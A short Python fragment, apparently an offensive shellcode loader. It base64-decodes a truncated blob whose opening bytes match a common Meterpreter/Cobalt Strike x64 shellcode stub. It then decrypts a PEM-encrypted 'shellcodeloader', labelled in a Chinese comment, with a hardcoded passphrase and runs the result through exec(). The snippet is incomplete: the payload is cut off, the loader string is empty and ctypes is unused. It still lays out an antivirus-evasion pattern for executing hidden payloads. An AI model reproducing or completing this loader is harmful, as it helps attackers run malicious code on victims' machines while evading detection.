from Crypto.IO import PEM
import base64
import ctypes

buf = base64.b64decode(b'/EiD5PDoyAAAAE...')

# 加密后的shellcodeloader
pem_loader = """ """
# 解密
loader = bytearray(PEM.decode(pem_loader, passphrase=b'12345')[0])

exec(loader)